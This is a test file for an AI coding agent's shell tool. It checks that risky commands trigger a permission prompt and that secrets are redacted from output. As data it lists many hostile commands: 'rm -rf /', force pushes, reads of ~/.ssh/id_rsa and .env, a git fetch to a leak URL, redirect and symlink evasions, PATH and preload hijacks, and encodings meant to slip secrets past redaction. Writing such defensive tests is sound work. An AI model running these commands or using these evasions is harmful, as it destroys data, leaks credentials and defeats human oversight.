// What the shell tool does with real commands in a real git repository, once it is running inside an agent session.
import { describe, expect } from "bun:test"
import { LayerNode } from "@opencode-ai/core/effect/layer-node"
import { Cause, Effect, Exit, Layer } from "effect"
import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs"
import fs from "node:fs"
import path from "path"
import { Global } from "@opencode-ai/core/global"
import { Config } from "@/config/config"
import { ShellTool } from "../../src/tool/shell"
import { provideInstance, testInstanceStoreLayer, tmpdirScoped } from "../fixture/fixture"
import { Agent } from "../../src/agent/agent"
import { Truncate } from "@/tool/truncate"
import { SessionID, MessageID } from "../../src/session/schema"
import { CrossSpawnSpawner } from "@opencode-ai/core/cross-spawn-spawner"
import { FSUtil } from "@opencode-ai/core/fs-util"
import { Plugin } from "../../src/plugin"
import { testEffect } from "../lib/effect"
import { RuntimeFlags } from "@/effect/runtime-flags"
import { spawnSync } from "node:child_process"

const it = testEffect(
  Layer.mergeAll(
    LayerNode.compile(
      LayerNode.group([CrossSpawnSpawner.node, FSUtil.node, Plugin.node, Truncate.node, Config.node, Agent.node, RuntimeFlags.node]),
    ),
    testInstanceStoreLayer,
  ),
)

const seed = (dir: string) => {
  const git = (...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: dir })
  git("init", "-q")
  mkdirSync(path.join(dir, "src"), { recursive: true })
  mkdirSync(path.join(dir, "data"), { recursive: true })
  mkdirSync(path.join(dir, "dist"), { recursive: true })
  writeFileSync(path.join(dir, ".gitignore"), "data/\ndist/\n.env\nhuge.bin\n")
  writeFileSync(path.join(dir, "src/a.ts"), "a\n")
  writeFileSync(path.join(dir, "data/local.db"), "only copy\n")
  writeFileSync(path.join(dir, "dist/out.js"), "built\n")
  writeFileSync(path.join(dir, ".env"), "API_KEY=x\n")
  writeFileSync(path.join(dir, "big.bin"), Buffer.alloc(3 * 1024 * 1024))
  git("add", "src", ".gitignore")
  git("commit", "-qm", "init")
}

const outcome = (command: string, canUndo = true, prepare?: (dir: string) => void) =>
  Effect.gen(function* () {
    const dir = yield* tmpdirScoped()
    seed(dir)
    prepare?.(dir)
    const asked: { patterns: readonly string[]; always: readonly string[]; risk?: unknown }[] = []
    const stop = new Error("stopped at prompt")
    const ctx = {
      sessionID: SessionID.make("ses_trust"),
      messageID: MessageID.make("msg_trust"),
      callID: "",
      agent: "build",
      abort: AbortSignal.any([]),
      messages: [],
      metadata: () => Effect.void,
      trust: { canUndo },
      ask: (req: { patterns: readonly string[]; always: readonly string[]; metadata: Record<string, unknown>; harmless?: boolean }) => {
        if (req.harmless) return Effect.void
        asked.push({ patterns: req.patterns, always: req.always, risk: req.metadata.risk })
        return Effect.die(stop)
      },
    }
    const exit = yield* Effect.gen(function* () {
      const tool = yield* (yield* ShellTool).init()
      return yield* tool.execute({ command }, ctx as never)
    }).pipe(provideInstance(dir), Effect.exit)
    if (Exit.isFailure(exit) && Cause.squash(exit.cause) !== stop) throw Cause.squash(exit.cause)
    return asked[0]
  })

// For the redirect evasions: it must stop at the prompt, and what it would have written must not exist.
const stoppedBefore = (command: string, prepare: (dir: string) => void, written: (dir: string) => boolean) =>
  Effect.gen(function* () {
    const dir = yield* tmpdirScoped()
    seed(dir)
    prepare(dir)
    const asked: unknown[] = []
    const stop = new Error("stopped at prompt")
    const ctx = {
      sessionID: SessionID.make("ses_trust"),
      messageID: MessageID.make("msg_trust"),
      callID: "",
      agent: "build",
      abort: AbortSignal.any([]),
      messages: [],
      metadata: () => Effect.void,
      trust: { canUndo: true },
      ask: (req: { harmless?: boolean }) => {
        if (req.harmless) return Effect.void
        asked.push(req)
        return Effect.die(stop)
      },
    }
    const exit = yield* Effect.gen(function* () {
      const tool = yield* (yield* ShellTool).init()
      return yield* tool.execute({ command }, ctx as never)
    }).pipe(provideInstance(dir), Effect.exit)
    if (Exit.isFailure(exit) && Cause.squash(exit.cause) !== stop) throw Cause.squash(exit.cause)
    expect(asked.length).toBeGreaterThan(0)
    expect(written(dir)).toBe(false)
  })

const run = (command: string, prepare?: (dir: string) => void) =>
  Effect.gen(function* () {
    const dir = yield* tmpdirScoped()
    seed(dir)
    prepare?.(dir)
    const ctx = {
      sessionID: SessionID.make("ses_trust"),
      messageID: MessageID.make("msg_trust"),
      callID: "",
      agent: "build",
      abort: AbortSignal.any([]),
      messages: [],
      metadata: () => Effect.void,
      trust: { canUndo: true },
      ask: () => Effect.void,
    }
    return yield* Effect.gen(function* () {
      const tool = yield* (yield* ShellTool).init()
      return yield* tool.execute({ command }, ctx as never)
    }).pipe(provideInstance(dir))
  })

describe("shell commands inside an agent session", () => {
  const runs = [
    "ls src",
    "ls -la",
    "ls -R src",
    "cat src/a.ts",
    "head -n 5 src/a.ts",
    "head -5 src/a.ts",
    "tail -n +2 src/a.ts",
    "wc -l src/a.ts",
    "grep -n a src/a.ts",
    "grep -rn a src",
    "find src -name 'a*' -type f",
    "ls | grep a",
    "cat src/a.ts | sort | uniq -c",
    "echo hi 2>/dev/null",
    "ls src 2>&1",
    "pwd",
    "true",
    "test -f src/a.ts",
    "ls src && cat src/a.ts",
  ]
  for (const command of runs) {
    it.live(`runs without a prompt: ${command}`, () =>
      outcome(command).pipe(Effect.map((asked) => expect(asked).toBeUndefined())),
    )
  }

  // Each of these used to run unprompted on the strength of Undo, or of a check of today's git config.
  const asksNow = [
    "git status",
    "git status --short",
    "git diff",
    "git log --oneline -5",
    "git show HEAD",
    "git branch",
    "git --version",
    "git add -A && git commit -qm x --allow-empty",
    "git reset --hard",
    "rm -rf src",
    "rm -rf dist",
    "mv src/a.ts src/b.ts",
    "cp src/a.ts src/b.ts",
    "mkdir -p src/lib && touch src/lib/x.ts",
    "echo hi > src/out.txt",
    "ls | sort > src/list.txt",
    "cat < src/a.ts",
  ]
  for (const command of asksNow) {
    it.live(`asks: ${command}`, () => outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
  }

  describe("anything that alters the shell makes the whole command not harmless", () => {
    const altering = [
      "printf -v HOME . ; git status",
      "printf -v PATH evil ; ls",
      "printf hi",
      "read x; ls",
      "export PATH=evil; ls",
      "declare -x PATH=evil; ls",
      "typeset PATH=evil; ls",
      "local x=1; ls",
      "readonly x=1; ls",
      "unset PATH; ls",
      "eval ls",
      "source x.sh; ls",
      ". ./x.sh; ls",
      "alias ls=rm; ls",
      "unalias ls; ls",
      "function ls { rm x; }; ls",
      "hash -p ./evil ls; ls",
      "set -a; ls",
      "shopt -s expand_aliases; ls",
      "trap 'rm x' EXIT; ls",
      "builtin cd src; ls",
      "command ls",
      "exec ls",
      "x=1; ls",
      "PATH=evil ls",
      "cd src && ls",
      "pushd src; ls",
      "constructor",
      "toString",
      "__proto__",
    ]
    for (const command of altering) {
      it.live(`asks: ${command}`, () =>
        outcome(command).pipe(
          Effect.map((asked) => {
            expect(asked).toBeDefined()
            // Allowing it means allowing all of it, and no part slips past on its own.
            if (command.endsWith("; ls")) expect(asked?.patterns.join(" ")).toContain("ls")
          }),
        ),
      )
    }

    it.live("a rule for the command that follows does not cover what came before it", () =>
      outcome("export PATH=evil; ls src").pipe(
        Effect.map((asked) => expect(asked?.patterns).toContain("export PATH=evil; ls src")),
      ),
    )

    it.live("a sequence lists every part, so allowing it is allowing all of it", () =>
      outcome("ls src ; bun test").pipe(
        Effect.map((asked) => {
          expect(asked?.patterns).toContain("ls src")
          expect(asked?.patterns).toContain("bun test")
        }),
      ),
    )
  })

  describe("only named flags and literal words", () => {
    const refused = [
      // Named elsewhere as ways out.
      "ls -L src",
      "ls -LR .",
      "ls --color=always src",
      "find -Ls .",
      "find . -L",
      "find . -delete",
      "find . -exec rm {} ;",
      "find . -newer /etc/hosts",
      "find . -fprint x",
      "grep -S x .",
      "grep -rS x src",
      "grep -R x src",
      "grep -O x src",
      "grep -f list x src",
      "grep -o a src/a.ts",
      "grep -ro . src",
      "grep --include=x y src",
      "sort -o out src/a.ts",
      "sort --co=xx src/a.ts",
      "sort -T /tmp src/a.ts",
      "uniq src/a.ts src/b.ts",
      "head -c 5 src/a.ts",
      "tail -c +5 src/a.ts",
      "tail -f src/a.ts",
      "wc --files0-from=x",
      "cat -",
      "cat -- src/a.ts",
      "cat /dev/stdin",
      "test -n x",
      "test -f /etc/hosts",
      "true x",
      // Off the list altogether.
      "printenv",
      "printenv SERVICE_TOKEN",
      "printenv SERVICE_TOKEN | cut -c2-",
      "env",
      "jq -n 'env|@base64'",
      "cut -c1 src/a.ts",
      "rg a src",
      "diff src/a.ts src/b.ts",
      "stat src/a.ts",
      "du src",
      "file src/a.ts",
      "which ls",
      "sleep 1",
      "tree src",
      "./ls",
      "/bin/ls",
      // What the shell would rewrite, in bash or in zsh.
      "cat =sh",
      "ls =sh",
      "echo =sh",
      "ls src/*",
      "ls *(e:'touch x':)",
      "echo $HOME",
      'echo "$HOME"',
      "echo \\$HOME",
      "cat ~/.ssh/config",
      "cat 'src/a.ts'$x",
      "ls ~",
      // Numbers are words too, and a file can be called one.
      "cat 5 | rm x",
    ]
    for (const command of refused) {
      it.live(`asks: ${command}`, () => outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }

    it.live("a file with a number for a name is checked like any other", () =>
      outcome("cat 5", true, (dir) => symlinkSync("/etc/hosts", path.join(dir, "5"))).pipe(
        Effect.map((asked) => expect(asked).toBeDefined()),
      ),
    )
  })

  describe("reading outside the project asks", () => {
    const outside = (dir: string) => {
      const out = `${dir}-outside`
      mkdirSync(out, { recursive: true })
      writeFileSync(path.join(out, "s.txt"), "OUTSIDE\n")
      symlinkSync(out, path.join(dir, "cl"))
      symlinkSync(path.join(out, "s.txt"), path.join(dir, "linkfile"))
      mkdirSync(path.join(dir, "tree"))
      symlinkSync(out, path.join(dir, "tree/deep"))
    }
    for (const command of [
      "cat linkfile",
      "cat cl/s.txt",
      "ls cl",
      "ls -R cl",
      "find cl -name s.txt",
      "grep -r OUTSIDE tree",
      "grep -r OUTSIDE cl",
      "wc -l linkfile",
      "test -f cl/s.txt",
      "cat ../x",
      "cat /etc/hosts",
      "git diff /etc/hosts /dev/null",
      "git blame --cont=/etc/hosts src/a.ts",
      "git config --list --fil=/etc/hosts",
      "cp cl/s.txt got.txt",
      "cp -R cl/ got",
    ]) {
      it.live(`asks: ${command}`, () => outcome(command, true, outside).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }
  })

  describe("a hostile environment or repository cannot supply its own program", () => {
    const withEnv = (name: string, value: string | ((dir: string) => string)) =>
      Effect.acquireUseRelease(
        Effect.sync(() => process.env[name]),
        () =>
          outcome("ls src", true, (dir) => {
            process.env[name] = typeof value === "string" ? value : value(dir)
          }),
        (previous) =>
          Effect.sync(() => {
            if (previous === undefined) delete process.env[name]
            else process.env[name] = previous
          }),
      )
    const original = process.env.PATH ?? ""
    for (const [label, next] of [
      ["an empty entry", `:${original}`],
      ["a relative entry", `evil:${original}`],
    ] as const) {
      it.live(`asks when PATH has ${label}`, () => withEnv("PATH", next).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }
    it.live("asks when PATH reaches inside the project", () =>
      withEnv("PATH", (dir) => `${dir}/bin:${original}`).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
    )
    it.live("asks when BASH_ENV is the project's", () =>
      withEnv("BASH_ENV", (dir) => `${dir}/rc`).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
    )
    it.live("asks when a library is preloaded", () =>
      withEnv("DYLD_INSERT_LIBRARIES", "/tmp/x.dylib").pipe(Effect.map((asked) => expect(asked).toBeDefined())),
    )
    it.live("asks under a shell whose grammar is not the one parsed here", () =>
      outcome("ls src", true, (dir) => {
        symlinkSync("/bin/sh", path.join(dir, "csh"))
        writeFileSync(path.join(dir, "swarm.json"), JSON.stringify({ shell: path.join(dir, "csh") }))
      }).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
    )
  })

  const lost = [
    "rm data/local.db",
    "rm -rf data",
    "rm .env",
    "rm big.bin",
    "rm -rf .",
    "rm -rf .git",
    "rm -rf ../elsewhere",
    "rm -rf /",
    "echo x > data/local.db",
    "mv src/a.ts .env",
    "git push --force origin main",
    "git reset --hard HEAD~1",
    "ls; git push -f",
    "cd src && git push --force",
    "git -C . push --force",
    "git reset --har HEAD~1",
    "git reset src/a.ts",
    "git reset feat/old",
    "git reset v1.0",
    "git commit --am -m x",
    "git commit --amend -m x",
    "git branch -qD victim",
    "git branch -C main victim",
    "git switch --force-c main HEAD~1",
    "/usr/bin/dropdb orders",
  ]
  for (const command of lost) {
    it.live(`asks, and says Undo cannot help: ${command}`, () =>
      outcome(command).pipe(
        Effect.map((asked) => {
          expect(asked?.risk).toBe("irreversible")
          // "Allow always" would approve the next, different, one.
          expect(asked?.always).toEqual([])
        }),
      ),
    )
  }

  it.live("says a plain push leaves the machine", () =>
    outcome("git push origin main").pipe(Effect.map((asked) => expect(asked?.risk).toBe("remote"))),
  )

  const unsure = [
    "PATH=/tmp ls",
    "FOO=1 ls",
    "ls() { rm -rf /; }; ls",
    "cd .. && ls",
    "cd .. && rm -rf x",
    "echo x > .git/hooks/pre-commit",
    "touch swarm.json",
    "echo x > ~/out",
    "echo x > $TARGET",
    "cat ~/.ssh/id_rsa",
    "bash -c 'rm -rf src'",
    "git add . && bun test",
    "rm $(cat list)",
  ]
  for (const command of unsure) {
    it.live(`keeps its normal prompt: ${command}`, () =>
      outcome(command).pipe(
        Effect.map((asked) => {
          expect(asked).toBeDefined()
          expect(asked?.risk).toBeUndefined()
        }),
      ),
    )
  }

  describe("a redirect the parser does not attach to one command", () => {
    const evasions = [
      "{ echo PWNED; } > ../out.txt",
      "(echo PWNED) > ../out.txt",
      "if true; then echo PWNED; fi > ../out.txt",
      "for i in 1; do echo PWNED; done > ../out.txt",
      "while false; do :; done > ../out.txt",
      "echo x | cat > ../out.txt",
      "{ echo gone; } > data/local.db",
      "{ echo x; } >> .git/config",
      "echo x | cat >> .git/config",
      "> .git/config",
      "> ../out.txt echo x",
      "echo x > ../out.txt extra",
      "echo x >> .gi?/config",
      "echo x >> .gi\\t/config",
      'echo x >> ".g"it/config',
      "echo x >> {.git,x}/config",
      "cat <<EOF > ../out.txt\nx\nEOF",
    ]
    for (const command of evasions) {
      it.live(`stops at the prompt: ${command.replaceAll("\n", " ")}`, () =>
        outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
      )
    }

    it.live("a group's redirect outside the project never lands", () =>
      stoppedBefore("{ echo PWNED; } > escaped.txt", () => {}, (dir) => existsSync(path.join(dir, "escaped.txt"))),
    )

  })

  describe("arguments the shell rewrites before the command sees them", () => {
    const rewritten = [
      "cat $F",
      "cat $(echo /etc/hosts)",
      "cat $'/etc/hosts'",
      "cat {/etc/hosts,/dev/null}",
      "cat ..\\/..\\/x",
      "ls ~root",
      "cat < /etc/hosts",
      "grep --file=/etc/hosts src/a.ts",
      "grep -f/etc/hosts src/a.ts",
      "diff --from-file=/etc/hosts src/a.ts",
      "sort --files0-from=list.txt",
      "sort -uo out.txt src/a.ts",
      "sort --out=out.txt src/a.ts",
      "git diff --no-index /etc/hosts /dev/null",
      "git blame --contents /etc/hosts src/a.ts",
      "find -L . -name x",
      "[[ -f /etc/hosts ]]",
      "x=1",
    ]
    for (const command of rewritten) {
      it.live(`keeps its normal prompt: ${command}`, () =>
        outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())),
      )
    }
  })

  describe("on a case-insensitive disk", () => {
    for (const command of [
      "echo x >> .GIT/config",
      "touch .GIT/hooks/post-merge",
      "touch SWARM.JSON",
      "touch .GitHub/workflows/y.yml",
      "touch .HUSKY/pre-commit",
      "touch .SWARM/command/y.md",
      "touch .ENV",
    ]) {
      it.live(`asks: ${command}`, () => outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }
  })

  describe("through a symlink that leaves the project", () => {
    const linked = (dir: string) => {
      const out = `${dir}-outside`
      mkdirSync(out, { recursive: true })
      writeFileSync(path.join(out, "outside.txt"), "outside\n")
      writeFileSync(path.join(out, "victim.txt"), "victim\n")
      symlinkSync(path.join(out, "outside.txt"), path.join(dir, "linkfile"))
      symlinkSync(out, path.join(dir, "linkdir"))
      symlinkSync(path.join(out, "not-there-yet.txt"), path.join(dir, "dangling"))
      symlinkSync(".git", path.join(dir, "innocent"))
    }
    const commands = [
      "echo PWNED > linkfile",
      "echo PWNED > dangling",
      "cp src/a.ts linkdir/copied.md",
      "rm linkdir/victim.txt",
      "cat linkfile",
      "cat linkdir/outside.txt",
      "echo x >> innocent/config",
    ]
    for (const command of commands) {
      it.live(`asks: ${command}`, () => outcome(command, true, linked).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }
  })

  describe("anything that can read or send data off the machine, or run a configured program", () => {
    for (const command of [
      "git fetch",
      "git fetch origin",
      "git fetch http://127.0.0.1:47203/leak/DATA",
      "git fetch . +HEAD~1:refs/heads/other",
      "git commit --allow-empty -F /etc/hosts",
    ]) {
      it.live(`asks: ${command}`, () => outcome(command).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }

    it.live("a URL is called out as leaving the machine, and offers no always", () =>
      outcome("git fetch http://127.0.0.1:47203/leak/DATA").pipe(
        Effect.map((asked) => {
          expect(asked?.risk).toBe("remote")
          expect(asked?.always).toEqual([])
        }),
      ),
    )

  })

  describe("moving history is not what a snapshot restores", () => {
    for (const command of ["git reset --soft HEAD~1", "git reset --keep HEAD~1", "git reset HEAD~1", "git checkout -B main HEAD~1", "git switch -C main HEAD~1"]) {
      it.live(`asks, and says Undo cannot help: ${command}`, () =>
        outcome(command).pipe(Effect.map((asked) => expect(asked?.risk).toBe("irreversible"))),
      )
    }
    for (const command of ["git reset", "git reset HEAD", "git reset -- src/a.ts"]) {
      it.live(`only unstaging asks without that warning: ${command}`, () =>
        outcome(command).pipe(
          Effect.map((asked) => {
            expect(asked).toBeDefined()
            expect(asked?.risk).toBeUndefined()
          }),
        ),
      )
    }
  })

  describe("git commands that write paths ask, and nothing reaches the path first", () => {
    const branchWithConfig = (dir: string) => {
      const git = (...args: string[]) => spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", ...args], { cwd: dir })
      git("checkout", "-q", "-b", "b")
      writeFileSync(path.join(dir, "swarm.json"), '{"permission":{"*":"allow"}}\n')
      git("add", "swarm.json")
      git("commit", "-qm", "c")
      git("checkout", "-q", "-")
    }
    for (const command of [
      "git mv src/a.ts swarm.json",
      "git mv src .swarm",
      "git mv src .github/workflows",
      "git mv src .husky",
      "git restore --source=b swarm.json",
      "git checkout b -- swarm.json",
      "git checkout b",
      "git rm -f swarm.json",
      "git clean -f",
      "git stash",
      "git stash push -a",
    ]) {
      it.live(`asks: ${command}`, () =>
        stoppedBefore(command, branchWithConfig, (dir) => existsSync(path.join(dir, "swarm.json"))),
      )
    }
  })

  describe("a nested repository holds history no snapshot has", () => {
    const nested = (dir: string) => {
      mkdirSync(path.join(dir, "vendor/nested"), { recursive: true })
      spawnSync("git", ["init", "-q"], { cwd: path.join(dir, "vendor/nested") })
      writeFileSync(path.join(dir, "vendor/nested/only.txt"), "x\n")
      spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "add", "."], { cwd: path.join(dir, "vendor/nested") })
      spawnSync("git", ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "x"], { cwd: path.join(dir, "vendor/nested") })
    }
    for (const command of ["rm -rf vendor/nested", "git clean -ffd"]) {
      it.live(`asks, and says Undo cannot help: ${command}`, () =>
        outcome(command, true, nested).pipe(Effect.map((asked) => expect(asked?.risk).toBe("irreversible"))),
      )
    }
    it.live("cleaning without one asks like any other, and does not say Undo cannot help", () =>
      outcome("git clean -fd", true, (dir) => {
        spawnSync("rm", [path.join(dir, "big.bin")])
      }).pipe(
        Effect.map((asked) => {
          expect(asked).toBeDefined()
          expect(asked?.risk).toBeUndefined()
        }),
      ),
    )
  })

  it.live("a finished command leaves no record behind to be ended later", () =>
    Effect.gen(function* () {
      const result = yield* run("echo done")
      expect(result.output).toContain("done")
      expect(result.metadata.exit).toBe(0)
      const left = fs.readdirSync(path.join(Global.Path.state, "shell-running", "ses_trust"))
      expect(left).toEqual([])
    }),
  )

  describe("what a command prints from a secret file", () => {
    const secrets = (dir: string) => {
      writeFileSync(path.join(dir, ".env"), "API_KEY=abcSECRETvalue123456\n")
      writeFileSync(path.join(dir, "credentials"), "[default]\naws_secret_access_key = plainSecretInCredentialsFile\n")
      writeFileSync(path.join(dir, ".netrc"), "machine x login me password netrcSecretValue\n")
      mkdirSync(path.join(dir, "config"), { recursive: true })
      writeFileSync(path.join(dir, "config/secrets.yaml"), "db_password: yamlSecretValue9\n")
      mkdirSync(path.join(dir, "a/b/c"), { recursive: true })
      writeFileSync(path.join(dir, "a/b/c/.env"), "DEEP_TOKEN=deepSecretValueInLevel3\n")
    }
    const hidden: [string, string][] = [
      ["cat .env", "abcSECRETvalue123456"],
      ["cat credentials", "plainSecretInCredentialsFile"],
      ["cat .netrc", "netrcSecretValue"],
      ["cat config/secrets.yaml", "yamlSecretValue9"],
      ["cat a/b/c/.env", "deepSecretValueInLevel3"],
    ]
    for (const [command, value] of hidden) {
      it.live(`hides the value: ${command}`, () =>
        run(command, secrets).pipe(
          Effect.map((result) => {
            expect(result.output).not.toContain(value)
            expect(result.output).toContain("[hidden:")
          }),
        ),
      )
    }
    const reshaping = [
      "grep -o . .env",
      "cut -c9-14 .env",
      "jq -Rrs @base64 .env",
      "cat .env | base64",
      "cat .env | cut -c9-14",
      "cut -c9-14 < .env",
      "head -c 12 .env",
      "python3 -c \"print(open('.env').read()[::-1])\"",
    ]
    for (const command of reshaping) {
      it.live(`withholds what it cannot recognise: ${command}`, () =>
        run(command, secrets).pipe(
          Effect.map((result) => {
            expect(result.output).toContain("output withheld")
            expect(result.output).not.toContain("SECRET")
            expect(result.metadata.output).not.toContain("SECRET")
            expect(result.output).not.toContain("=")
          }),
        ),
      )
    }
    it.live("what is shown and stored while a command runs is hidden too", () =>
      Effect.gen(function* () {
        const dir = yield* tmpdirScoped()
        seed(dir)
        secrets(dir)
        const live: string[] = []
        const ctx = {
          sessionID: SessionID.make("ses_trust"),
          messageID: MessageID.make("msg_trust"),
          callID: "",
          agent: "build",
          abort: AbortSignal.any([]),
          messages: [],
          metadata: (input: { metadata?: { output?: string } }) =>
            Effect.sync(() => {
              live.push(input.metadata?.output ?? "")
            }),
          trust: { canUndo: true },
          ask: () => Effect.void,
        }
        yield* Effect.gen(function* () {
          const tool = yield* (yield* ShellTool).init()
          return yield* tool.execute({ command: "cat .env" }, ctx as never)
        }).pipe(provideInstance(dir))
        expect(live.join("\n")).toContain("[hidden:API_KEY]")
        expect(live.join("\n")).not.toContain("abcSECRETvalue123456")
      }),
    )

    it.live("an ordinary reshape of an ordinary file is left alone", () =>
      run("cut -c1-1 src/a.ts").pipe(Effect.map((result) => expect(result.output).toContain("a"))),
    )
  })

  describe("a secret can only be read with someone asked", () => {
    const secrets = (dir: string) => {
      writeFileSync(path.join(dir, ".env"), "API_KEY=abcSECRETvalue123456\n")
      writeFileSync(path.join(dir, ".env-prod"), "API_KEY=abcSECRETvalue123456\n")
      mkdirSync(path.join(dir, ".envs"))
      writeFileSync(path.join(dir, ".envs/prod"), "API_KEY=abcSECRETvalue123456\n")
      symlinkSync(".env", path.join(dir, "notes"))
      mkdirSync(path.join(dir, "deep/er"), { recursive: true })
      writeFileSync(path.join(dir, "deep/er/.env"), "API_KEY=abcSECRETvalue123456\n")
      writeFileSync(path.join(dir, "deep/plain.txt"), "plain\n")
    }
    for (const command of [
      "grep -ro . .",
      "grep -rn x .",
      "grep -r x deep",
      "grep -c '^API_KEY=abcd' .env",
      "grep x .env",
      "cat .env",
      "cat .env | sort",
      "cat notes",
      "cut -c9-14 notes",
      "head -n 1 .env",
      "wc -c .env",
      "cat .env-prod",
      "cat .envs/prod",
      "grep -r x .envs",
      "cat .git/config",
      "grep -r url .git",
      "cp .env notes.txt",
      "mv .env notes.txt",
    ]) {
      it.live(`asks: ${command}`, () => outcome(command, true, secrets).pipe(Effect.map((asked) => expect(asked).toBeDefined())))
    }
    it.live("listing names reads no contents", () =>
      outcome("find . -name '.env'", true, secrets).pipe(Effect.map((asked) => expect(asked).toBeUndefined())),
    )
    it.live("a recursive read of a directory holding none needs no prompt", () =>
      outcome("grep -rn plain deep/plain.txt", true, secrets).pipe(Effect.map((asked) => expect(asked).toBeUndefined())),
    )
  })

  describe("the prompted way to read one still hides what it can", () => {
    const secrets = (dir: string) => writeFileSync(path.join(dir, ".env"), "API_KEY=abcSECRETvalue123456\n")
    it.live("hides the value once allowed", () =>
      run("cat .env", secrets).pipe(
        Effect.map((result) => {
          expect(result.output).not.toContain("abcSECRETvalue123456")
          expect(result.output).toContain("[hidden:")
        }),
      ),
    )
  })

  it.live("without snapshots nothing changes, and reading still works", () =>
    Effect.gen(function* () {
      expect(yield* outcome("rm -rf src", false)).toBeDefined()
      expect(yield* outcome("touch x", false)).toBeDefined()
      expect(yield* outcome("ls src", false)).toBeUndefined()
    }),
  )
})
